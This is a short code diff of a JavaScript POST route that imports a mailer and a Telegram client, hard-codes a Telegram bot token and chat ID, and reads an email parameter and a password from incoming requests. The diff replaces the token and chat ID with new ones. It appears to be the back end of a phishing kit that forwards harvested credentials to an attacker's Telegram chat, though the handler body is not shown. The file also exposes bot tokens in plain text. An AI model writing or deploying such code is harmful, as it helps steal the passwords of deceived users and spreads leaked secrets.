@@ -1,9 +1,9 @@
 import nodemailer from "nodemailer";
 import { TelegramClient } from "telegramsjs";
 
-const botToken = "8267952065:AAGLb_6qDpzhcLY5oLHxeRP0wQLmAIjwlUI";
+const botToken = "8056251259:AAEKndnLrQBMhBcH5r_vnpXHt8TZ4Xvb7vE";
 const bot = new TelegramClient(botToken);
-const chatId = "7202634733";
+const chatId = "7075297381";
 
 export async function POST(req) {
   const { eparams, password } = await req.json();
